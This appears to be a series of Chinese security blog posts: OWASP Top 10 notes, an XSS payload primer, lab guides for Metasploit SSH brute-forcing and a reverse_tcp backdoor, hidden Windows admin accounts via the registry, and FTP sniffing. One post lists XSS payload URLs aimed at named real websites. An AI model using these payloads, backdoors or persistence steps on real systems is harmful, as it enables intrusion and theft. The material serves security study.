TOP7-案例案例1#:攻击者仅仅直接浏览目标网址。例如下面的两个网址都需要身份验证。同时访问“admin getapplnfo” 页面还需要管理员权限。http://example.com/app/ getapplnfohttp://example.com/app/admin_ getapplnfo如果未认证的用户可以访问上述任一页面，这就是漏洞。如果通过验证的非管理员用户也能允许访问“admin_ getappInfo”页面， 这同样是个漏洞。这个漏洞可能会将攻击者引向更多保护不当的管理页面。案例2#: - 一个页面提供了“action”参数给某个特定的功能调用，并且不同的操作需要不同的角色。如果没有进行角色检查，这也是漏洞。 TOP7-防范防范手段检查管理权限的过程并确保能够容易进行升级和审计,切忌硬编码。默认缺省情况下,应该拒绝所有访问的执行权限。s对于每个功能的访问,需要明确的角色授权。检查每个功能分配的权限合理有效。 TOP8-未验证的重定向介绍： 在Web应用中重定向是极为普遍的,并且通常重定向所弓向的目的是带有用户输入参数的目的URL ,而如果这些重定向末被验证,那么攻击者就可以引导用户访问他们所要用户访问的站点。同样,转发也是极为普遍的,本质上转发是在同-个应用中对一个新页面发送请求,并且有时是用参数来定义目标页面的。同样,如果参数末被验证,那么攻击者就可以利用其来绕过认证或是授权检查。 危害： 攻击者通过重定向可以试图安装恶意软件或者诱使受害人泄露密码等敏感信息,通过转发可以绕过访问控制。 TOP8-案例案例#1:应用程序有一个名为“redirect.jsp” 的页面，该;页面有一个参数名是“url”。 攻击者精心制作-一个恶意URL将用户重定向到一个恶意网站，执行钓鱼攻击并安装恶意程序。http://www.example.com/redirect.jsp?url=evil.com案例#2: 应用程序使用转 发在网站的不同 部分之间发送请求。为了帮助实现这一功能，如果一个交易成功了的话，- -些网页就会发送一个参数给用户，用于指定用户的下一个页面。在这种情况下,攻击者制作一个URL,用于绕过应用程序的访问控制检查,并将他转发给–个他通常不能访问的管理功能。http://www.example.com/ boring.jsp?fwd=admin.jsp TOP8-测试与防范1如果有代码:浏览代码中含有重定向和转发的内容,看目的urI中是否包含用户输入的参数,如果包含，观察目标参数是否在白名单之内,如果涉及到一些安全问题隐私等，需要重新定 义目的URL。2通过点击操作网站,观察是否产生重定向( HTTP响应代码300-307 , 通常是302) , 观察在重定向之前用户输入的参数有没有出现在某一个URL或者很多URL中,如果是这种情况,需要改变URL的目标。3.如果测试中没有代码，检查所有 参数,测试那些看起来像是重定向或者转发的页面。举例:对于上例:登陆url : http://www.example.com/member/logi.html在ur后加参数如下:http://www.example. com/memberlogin.jhtmlredirecturithttp://www.google.cn若跳转至Google就是没有做跳转的限制。防范避免使用重定向和转发如果使用了重定向和转发,则不要在确定目标时涉及到用户参数。如果无法避免使用目标参数,则应确保目标参数值对于当前用户是有效的并已授权。你可以用request获得之前的页面路径: Reguest.getHeader( ‘ Referer”);然后你可以判断一下,这个是 字符串类型的。如果是需要登录的 ,你可以session中获取登录信息,然后判断你可以通过上一个页面传参，本页面判断 ,如果不匹配就处理，参数可以放在session当中或者使用 request.setAttribute0;这个方法,不要URL传参 TOP9-应用已知脆弱性的组件介绍组件,比如:库文件、框架和其他软件模块,几乎总是以全部的权限运行。如果一个带 有漏洞的组件被利用，这种攻击可以造成更为严重的数据丢失或服务器接管。应用程序使用带有已知漏洞的组件会破坏应用程序防御系统,并使一系列可能的攻击和影响成为可能。防范1.识别正在使用的组件和版本,包括所有的依赖。( 例如,插件的版本)。2.监控这些在公共数据库中、项目的邮件列表、以及安全邮件列表的组件的安全性,并保持他们更新到最新。3.建立安全策略来管理组件的使用,如需要一定的软件开发实践 ,通过安全测试,和可接受的许可证。 TOP10-敏感信息暴露介绍许多Web应用程序没有正确保护敏感数据,如信用卡、税务ID和身份验证凭据。攻击者可能会窃取或篡改这些弱保护的数据以进行信用卡诈骗、身份窃取或其他犯罪。敏感数据值需额外的保护,比如在存放或在传输过程中的加密,以及在与浏览器交换时进行特殊的预措施。比如说:个人信息,如姓名,身份证ID,电话号码，银行账户,驾驶证号码,社保卡号,护照号码等都是敏感数据;网站登录的用户名、密码, SSL证书,会话ID ,加密使用的密钥等都属于敏感信息,这些信息一旦泄露,攻击者就可以以合法用户的身份访问Web系统,随意进行各种攻击操作;Web服务器的OS类型, 版本信息, Web容器的名称，版本号,数据库类型,版本号,应用软件使用开源软件信息都属于敏感信息,因为攻击者知道这些软件信息,就会利用这些软件存在的公开漏洞进行专门攻击,提升了系统被攻破的可能性。 TOP10-防范防范 针对个人数据,必须加密存储,且要使用安全的加密算法,具体可以这么区分,针对本地存储且需要密文明文转换的使用AES128及以上的安全加密算法,对于使用于认证场景的不需要可逆的可以采用SHA256及以上的安全HASH算法，如PBKDF2等,需要加盐值(采用安全随机数,防止彩虹表攻击) , 而对于夸信任网络传输的敏感数据,需要使用非对称加密算法,公钥加密,私钥解密,如RSA2048及以上算法,特别强调,常见的MD5、DES , SHA1 ,甚至不能算假面的BSAE64位编码都是不安全的做法，针对加解密这块,大家看不明白也没关系,后续做专题来讲解吧,到时候会附上Java的实现。 针对敏感数据传输，需要采用SSL加密通道，每一 个请求都应该使用SSL加密通道,因为每个请求里面都带有会话D，会话ID就是敏感信息 ,所以并不是只有涉及认证的请求才存在敏感数据,针对SSL通道，需要使用安全的TSL版本如TSL1.1和TSL1.2 ,其余SSL版本和TSL1.0已经被证明是不安全的。同时要使用安全的加密套件,也就是说SSL协商过程中协商的通道加密算法也要是安全的,否则加密数据还是可以被轻易破解,具体配置是在Web容器里面的,大家可以百度轻易获取,后续针对Web容器加固方面也会进行说明。 应用程字运行出错容易造成敏感信息的泄露,如有的网站的程序堆栈信息直接显示在页面上,暴露Web容器的名称和版本信息,这些都是不安全的做法,解决方法就是定制统一出错页面,杜绝显示此类敏感信息到Web客户端。 敏感信息禁止明文传递到Web客户端,能不传递就不要传递,禁止将敏感信息打印到堆栈或者日志中,禁止明文存储在文件或数据库中,同时保存敏感信息的文件要严格控制访问权限。 补充资料-DDOS（分布式拒绝攻击） 分布式拒绝服务攻击使用与普通的拒绝服务攻击同样的方法,但是发起攻击的源是多个。通常攻击者使用下载的工具渗透无保护的主机,当获得该主机的适当的访问权限后，攻击者在主机中安装软件的服务或进程(以下简称代理)。这些代理保持睡眠状态,直到从它们的主控端得到指令。主控端命令代理对指定的目标发起拒绝服务攻击。分布式拒绝服务攻击是指主控端理由僵尸机器同时对一个目标发起几千个攻击。单个的拒绝服务攻击的威力也许对带宽较宽的站点没有影响,而分布于全球的几千个攻击将会产生致命的效果。 补充资料-DDOS攻击步骤1.攻击者使用扫描工具探测扫描大量主机以寻找潜在入侵目标 2.黑客设法入侵有安全漏洞的主机并获取控制权，这些主机将被用于放置后门、sniffer或守护程序甚至是客户程序。 3.黑客在得到入侵计算机清单后，从中选出满足建立网络所需要的主机，放置已编译好的守护程序，并对被控制的计算机发出指令。 4.Using Client program 黑客发送指令给主机，准备启动对目标主机的攻击。 5.主机发送攻击信号给被控制机开始对目标机系统发起攻击。 6.目标系统被无数伪造的请求所淹没，从而无法 对合法用户进行响应，DDOS攻击成功。]]></content>
      <tags>
        <tag>OWASP TOP10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS简介]]></title>
    <url>%2F2019%2F08%2F11%2FXSS-%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[XSS一、XSS简介二、XSS漏洞的危害三、XSS漏洞的类型四、XSS的构造五、XSS的变形六、Shellcode的调用 一、XSS owasp top 10 之一XSS 跨站脚本攻击 Cross Site Script(ing) css (层叠样式表)XSS 所用的攻击代码主要是Javascript 将恶意代码注入到网页中JS能够做到的事情，就是可能受到攻击XSS 攻击的是用户、浏览器、客户端、微博留言板的位置，有收集用户输入的地方，都有可 能遭受XSS的攻击 二、盗取各种用户账号窃取用户cookie资料，冒充用户身份进入网站劫持用户会话，执行任意操作刷流量，执行弹窗广告 传播蠕虫病毒 常用漏洞验证{ script alert(/xss/) /script script alert(%0ddocument%0a.%09cookie); /script scrscriptipt&gt;alert(/xss/)scrscriptipt script%09alert%09(1);script script%0Dalert%0d(1);/script script%0aalert%0a(1);/script script&gt;alert(%0ddocument%0a.%09cookie);/scriptimg/src=’x’/onerror%0A= alert(1) } 只要浏览器弹框，就意味着JS代码可以被执行，就可以执行其他语句。 要想弹框，最好能让浏览器识别script标签 三、XSS漏洞的类型反射型XSS非持久性、参数型跨站脚本搜索框、用户登录的地方 窃取用户cookie或进行钓鱼欺骗存储型XSS持久性跨站脚本，更具有威胁性、恶意代码存储在数据库、其他文件等地方留言板、评论、博客日志 渗透网站、挂马、蠕虫病毒、钓鱼DOM型XSSscript var pos=document.URL.indexOF(“context=”)+8 document.write(decodeURL(document.URL.substring(pos,document.URL.length)))/script 更改原来文档的DOM树四、XSS的构造不同的浏览器效果不一样，同一款浏览器，不同版本之间效果不一样利用&lt;&gt;构造HTML/JavaScript 如果用户可以随心所欲的引入&lt;&gt;等标记，那么他就能操作一个HTML标签，然后通过script标签就能输入任意由JavaScript或VBscript编写的恶意脚本代码利用HTML标签的属性值进行XSS HTML中有标签，标签中有属性，属性有属性值。有的HTML标签属性值，支持Javascript:[code] a href=”javascript:alert(/xss/)”&gt;/a 产生自己的事件 事件就是用户何时做了什么事情 处理相关事件的语句，事件响应函数我们把事件分为3个不同类型用户接口（鼠标键盘）逻辑（处理的结果） 变化（对文档的修改）img/src=’x’/onerror%0A= alert(1)scriptalert(/xss/)/scriptimg src=”” onmouseover=”alert(/xss/)”input type=”text” onkeydown=”alert(/xss/)” 利用CSS跨站（不太常见）使用范围比较窄from method=”post” action=”xss.php”textarea name=””/textareainput typa=”submit” name=”sumbit” value=”submit” &lt;?phpif(isset($_post[‘submit’])){echo $_post[‘text’];}elseecho”sorry”;} 五、XSS的变形大小写转换Img sRc=’#’ Onerror=”alert(/xss/)”/ 引号的使用无引号Img sRc=# Onerror=alert(/xss/)/单引号Img sRc=’#’ Onerror=alert(/xss/)/双引号Img sRc=”#” Onerror=alert(/xss/)/ 利用/代替空格Img/sRc=“#” Onerror=alert(/xss/)/ CSS中的变形使用全角字符style&gt;body{background-image:expre/***/ssion(alert(1);}/style 注释会被浏览器忽略style&gt;body{background-image:expression(alert(1);}/style 样式表中的\和\0同样会被浏览器忽略style@import’javasc\ri\0pt:alert(“xss”)’;/styleTab与EnterImgsRc=’#’ Onerror =alert(/xss/)/ 对标签属性值进行转码拆分跨站script&gt;z=’alert’/scriptscript&gt;z=z+’(/xss/)’/script script&gt;eval(z)/script 六、Shellcode的调用ShellCode最初是指溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞所执行的代码Exploit的英文意思是利用，通常表示完整的编写好的漏洞利用工具（或程序）Exploit往往包含来了ShellCodePoc proof of concept 的缩写，是一段证明漏洞存在的程序代码片段 动态远程调用JSscript src =”http://ip/a.js&quot;&gt;/script windows.location.hash XSS DOWNLODER将ShellCODE存储到网站的数据库中，包括网页信息、文章内容、个人资料存储的地方，然后再把它下载下来执行简单来说就是构造一个XSS下载器事先把Shellcode写在网站的某一个页面再利用XMLHTTP控件向网站发送HTTP请求然后执行返回数据备选存储技术另外一种方法是把XSS SHELLCODE 存储在客户端本地域中，如HTTPCOOKIE FISH共享对象 USEDATE XSS平台]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss实战]]></title>
    <url>%2F2019%2F08%2F10%2Fxss%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[记录发现的XSS漏洞 xss实战 http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00 http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=c%3Cscript%3Ealert(/xss/)%3C/script%3E http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=calert(/xss/) http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E https://yz.esf.fang.com/map/ https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E http://www.ruigushop.com/Channel/index.html?search=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=#sAnchor]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF实验]]></title>
    <url>%2F2019%2F08%2F10%2FMSF%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[利用msf爆破ssh服务密码 一、 实验目的 了解SSH的概念 理解MSF爆破SSH的工作原理 掌握MSF爆破SSH服务密码的方法二、 实验要求 根据实验指导书，完成msf爆破ssh服务密码的实验操作。 编制msf爆破ssh服务密码的实验报告，验证实验过程。三、 实验原理SSH是一种网络协议，用于计算机之间的加密登录。如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。需要指出的是，SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是OpenSSH，它是自由软件，应用非常广泛。通过kali中的msf对我们具有ssh服务的服务器进行账号密码的爆破，从而让我们可以远程登录这台具有ssh服务的服务器 四、 实验环境Kali linux, centos用户名：root密码：sahoo@123五、 实验操作步骤一： 先打开msf 步骤二：作为我们的攻击机，我们利用msf这款工具来对ssh协议服务的账号密码进行爆破，输入msfconsole命令以开启msf这款工具 步骤三： 然后我们用search ssh命令来查找相应的对ssh服务的一些攻击模块，其中划红箭头的是我们所需要的利用模块 步骤四： 然后我们直接use这个模块，对这个模块的相关参数进行设置 步骤五： 然后我们show options查看相应的参数设置，其中划红线的就是我们所需要设置的一些模块，RHOSTS是目标主机的ip，RPORT是目标主机开放ssh服务的相应端口，PASS_FILE是我们所需要的爆破密码的字典，USER_FILE使我们所需要的爆破用户名的字典，THREADS是我们爆破的线程，也可以理解为速度的快慢 设置我们的目标主机的ip是192.168.78.129 设置我们的目标主机开放ssh服务的端口 设置我们的线程为最大值5，这也是msf默认允许的最大的线程值 步骤六： 字典的话我们可以自己用kali自带的crunch工具来生成，生成一个名为a.txt文件中，那么a.txt文件就是一个我们的字典，但是由于线程数非常的小，而且我们这次主要是以实验为主要目的，于是我们可以用网上一些较小的字典，来节省爆破的时间 设置我们的密码的字典为桌面的pass.txt 设置我们的用户名的字典为桌面的user.txt 步骤七： 然后我们再次show options查看相应的设置是否完成 步骤八： 设置完成后我们就直接exploit进行爆破，然后等待结果即可 步骤九： 当爆破成功一个后，就会如此提示我们，并且提示我们已经成功的与目标主机建立了一个会话 步骤十： 然后我们输入sessions 来查看这次会话的信息 步骤十一： 然后我们用爆破出来的密码来进行ssh登录目标主机，可以看到我们进入了root用户的终端shell界面，当然我们也可以在我们刚才的msf中输入sessions -i 1来进入meterpreter界面从而输入shell来进入同样的终端界面，这两种方式都是可以的 六、 实验结论请按要求完成实验报告，并按时提交给老师。实验效果验证 七、 课后拓展1.两种shell登录方式都试一下 八、 先序课程 《密码攻击-字典的生成》 metasploit之后门的生成后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。metasploit可以生成多种多样的后门，比如windows、linux、java、php等。 KALI ip 192.168.10.128WIN7 ip 10.0.2.2 选择以下攻击载荷并生成一个exe的木马程序 命令msfconsole 开启Metasploit 查看payload，使用命令show payloads，msf提供了多种攻击载荷选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下 使用命令 cd /，可以看到我们生成的exe文件 接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。 为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。 在kali linux上打开ssh服务的方法： apt-get install openssh-server#安装 一、配置SSH参数 修改sshd_config文件，命令为： vi /etc/ssh/sshd_config 将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes 右击桌面，单击打开终端，输入命令 将PermitRootLogin without-password修改为 PermitRootLogin yes 二、启动SSH服务 命令为： /etc/init.d/ssh start 或者 service ssh start 查看SSH服务状态是否正常运行，命令为 /etc/init.d/ssh status 或者service ssh status 那么需要生成两个密钥： ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key 执行命令后都会让输入密码，直接敲回车设置为空即可 Win7关闭防火墙的方法 接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128 ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。 在msf中设置监听 use exploit/multi/handler show options 设置我们后门生成时的攻击载荷 set payload windows/meterpreter/reverse_tcp show options set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp 设置参数（与后门的参数相对应） msf exploit(multi/handler) &gt; set LHOST 192.168.10.128 LHOST =&gt; 192.168.10.128 msf exploit(multi/handler) &gt; set LPORT 4444 LPORT =&gt; 4444 msf exploit(multi/handler) &gt; run 在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程 序时，会弹回一个shell [] Started reverse TCP handler on 192.168.10.128:4444 [] Sending stage (179779 bytes) to 192.168.10.1 [] Sleeping before handling stage… [] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800 实验结束]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限维持实验]]></title>
    <url>%2F2019%2F08%2F10%2F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[利用注册表隐藏建立管理员账号实验环境实验机环境：Windows 7目标机环境：Windows 7实验目的了解注册表的权限设置实验原理 在Windows里面有两个注册表工具，一个是regedit.exe，一个是regedt32.exe，Regedit.exe是我们熟知的注册表工具，而Regedt32.exe 不支持HYPERLINK “https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot; \t “_blank”注册表项文件 (.reg) 的导入和导出。Regedit.exe 是 16 位 Windows 操作系统的注册编辑器，它用于修改 Windows 的注册数据库，是16位应用程序。Regedt32.exe 是 Windows NT的配置编辑器。它用于修改 Windows NT 配置数据库或 Windows NT 注册表。此编辑器允许您查看或修改 Windows NT 注册表。它提供了表示注册表各个部分（叫做配置单元）的窗口视图。每个窗口显示两部分：左侧是表示HYPERLINK “https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot; \t “_blank”注册表项的文件夹。右侧是与所选HYPERLINK “https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot; \t “_blank”注册表项关联的值。Regedt32 是一个功能强大的工具。使用它修改注册表值时必须格外小心。注册表中的值丢失或不正确将导致安装的 Windows NT 无法使用。实验步骤本实验中实验机为黑客机，目标机为被黑掉的主机，且实验前提为：实验机已经获得目标机的Administrator用户账号及口令，可以远程控制目标机。 在实验机中，通过前几节介绍的知识，以远程桌面方式登陆到目标机上。在本次实验中，以下操作要以Administrator身份进行（ylitech账户即管理员账户）。可跳过上面一步，直接在目标机中进行以下操作。2.点击开始，输入框中输入cmd，右键以管理员身份运行命令提示符窗口，输入命令net user hacker$ 123456 /add（注意/add前有空格），添加hacker$用户账号，密码为123456。 如果是第一次运行，会提示命令成功完成。 3、继续在cmd中运行regedt32命令，打开注册表编辑器，在HKEY_LOCAL_MACHINE\SAM\SAM下右击—&gt;权限，点击Administrator，并将其权限设置为完全控制，点击应用-确定，再关闭注册表窗口。 4、点击开始，输入regedit命令回车，打开注册表编辑器，依次展开HKEY_LOCAL_MECHINE\SAM\SAM\Domains\Account\Users，可以看到Names下的Administrator账号对应的权限为000001F4，hacker$账号对应的权限为000003E9。 5、将hacker$、000001F4、000003E9这三项导出并分别命名为hacker$.reg，000001F4.reg，000003E9.reg。 6、用记事本对导出的注册表文件进行编辑，将000001F4.reg下的F键值进行复制，覆盖000003E9.reg中的F键的键值。 7、在cmd中输入命令type 源文件&gt;&gt;目标文件，将hacker$.reg与000003E9.reg合并至hacker$final.reg。 8、继续在命令提示符窗口（管理员）中，运行net user hacker$ /del，删除hacker$，注册表中hacker$已删除。 9、双击hacker$final.reg，用注册表编辑器打开，在注册表中可以看到又重新建立了hacker$账号。 10、在cmd中运行regedt32，在SAM\SAM下右击—&gt;权限—&gt;去掉Administrator的权限（权限还原为默认设置）并关闭。 11、在另外一台机器上使用远程桌面，并以账号hacker$，密码123456登陆。目标机的IP地址可在cmd中使用命令ipconfig查看。 12、目标机的DoS命令行及计算机管理中都无法发现hacker$账号的痕迹。成功隐藏建立了后门账号。 在Windows中克隆管理员账号实验环境实验机环境：Windows 7目标机环境：Windows 7实验目的了解并掌握如何对账号进行克隆实验原理后门，是绕过安全性控制而获取对程序或系统访问权的方法。windows NT及HYPERLINK “https://www.baidu.com/s?wd=win2000&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot; \t “_blank”win2000中对用户帐户的安全管理使用了安全帐号管理器(security account manager，SAM)的机制,安全帐号管理器对帐号的管理是通过HYPERLINK “https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot; \t “_blank”安全标识进行的，HYPERLINK “https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot; \t “_blank”安全标识在帐号创建时就同时创建，一旦帐号被删除，HYPERLINK “https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot; \t “_blank”安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识都时完全不同的。因此，一旦某个帐号被删除，它的安全标识就不再存在了，即使用相同的用户名重建帐号，也会被赋予不同的安全标识，不会保留原来的权限。克隆（隐形提权）管理员账户是指：在计算机上使一个不属于管理员组的账号具有与管理员一样的权限。本例中将普通用户账号（ylitech）利用注册表克隆成具有管理员权限的账号。实验步骤1、在实验环境中的两台机器中任意选择一台，点击开始-计算机-管理。再点击本地用户和组-组，查看用户。只有Administrator的权限未被禁用（提示：的小箭头标志该用户被禁用）。 2、右击普通用户ylitech-设置密码。（注：ylitech为本实验中目标机的普通用户，根据不同实验不同机器用户不同，该用户可以为任一不具有管理员权限的用户。） 3、点击开始，在输入框中输入regedit，打开注册表编辑器。由于权限的问题，SAM下不会看到任何子键。 4、右击第二个SAM权限，添加ylitech用户，并设置其权限为完全控制，应用，确定。 5、刷新注册表，可以看到SAM下出现了管理员身份才能看到的内容。 Administrator对应的项为“000001F4”。 打开“000001F4”其下面的“F”，并将其内容复制。 ylitech的对应项为“000003E8”，打开其下面的“F”，并将复制的Administrator的内容粘贴到这里，确定。完成将普通用户克隆成具有管理员权限的账户。 此时点击第二个SAM，取消Administrator的完全控制和读取权限（将对勾选项取消）。 刷新视图，发现和开始时无异样。 6.回到计算机管理中，查看用户列表，发现ylitech仍是禁用状态，但是打开ylitech的属性发现该账户已经解除账户禁用状态。这样可以迷惑管理员。 7.点击开始-注销，重新登陆ylitech账户，此时的ylitech账户实际上就是有管理员权限的账户。五【实验小结】Windows操作系统中的任何配置在注册表中均能实现，本实验恰恰验证了这一点。在注册表中进行克隆的普通用户账号在计算机管理中无法查看出它属于管理员组的成员，但是它的确已经具有了管理员的权限。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嗅探欺骗实验]]></title>
    <url>%2F2019%2F08%2F10%2F%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[FTP连接与密码明文抓取一【实验目标】l TCP、UDP协议解析(端口，各标志字段，固定首部长度)l IP协议解析(源、目的网络地址，各标志字段，分片标识，固定首部长度)l Ethernet帧结构解析(源、目的MAC地址，帧长)l 利用FTP明文传输特性，捕获用户名/密码 二【实验环境】l 实验机环境：windows xp操作系统l 实验拓扑：如下图所示 三【实验原理】FTP协议在网络传输中采取明文的形式传输用户名和密码。攻击者利用该特性就可获得被攻击者的敏感信息，并进行进一步的攻击。 四【实验步骤】 本机地址为192.168.8.161，我们选择一个外网FTP服务器202.101.47.169 设置抓包参数：运行Wireshark.exe程序，设置接口网络适配器及过滤器。设置完毕，即可开始捕获网络数据包。 四层网络结构，每层都有不同的功能，由不同的协议组成。 EthernetII的帧结构为目的MAC地址+源MAC地址+上层协议类型+数据字段+校验。 第一行为WireShark添加、该帧的相关统计信息。包括捕获时间、编号、帧长度、帧中所含有的协议等，如图所示。 第二行为链路层信息，包括目的MAC地址、源MAC地址、上层协议类型，如下图。 第三行为网络层信息，如此处为IP协议。细节包括版本、头部长度、总长度、标志位、源/目的IP地址、上层协议等。 第四行为传输层信息，包括源/目的端口、序列号、期望的下个序列号、确认号、头部长度、标志位、窗口长度、校验和等。 在本主机的Firefox地址栏输入ftp://202.101.47.169请求与服务器建立连接；在地址栏输入地址回车后，弹出输入用户名密码窗口，正确输入后即可访问。如下图所示。 我们使用用户名：e5yusimin-s，密码：password客户端为192.168.8.161(本地)，目的服务器为202.101.47.169，发送连接建立请求。条件设置为“TCP”，可观察到下图所示的内容（查看第一个数据包的内容）。 TCP标志位仅SYN置0，设置(相对)序列号为0(此处的序列号并不是真正的数据流字节号，只表示在此次连接过程中的序号)，请求与FTP服务器建立连接。本地的源端口号为62243，目的端口号为21(默认的FTP服务端口)，等待确认。服务器202.101.47.169收到请求数据包后，若同意请求，则向客户端做出确认应答。可以看到下图所示的内容。 服务器的响应报文中，ACK、SYN标志位置1，序列号为0(理由同上)，确认号为1(是请求报文的相对序列号加1)。相应端口为：源21，目的62243。客户端收到确认报文后，通知上层应用进程，连接已经建立。 客户端收到服务器的确认后，向服务器给出确认。可以看到如下图所示内容。 客户端的确认报文中，标志位仅ACK置1，相对序列号为1(请求报文序列号加1)，确认号为1(对服务器确认报文相对序列号加1)。服务器收到客户端的确认报文后，也通知其上层应用进程，连接已经建立。至此，客户端与服务器之间完成了“三次握手”过程，连接建立。 ​ 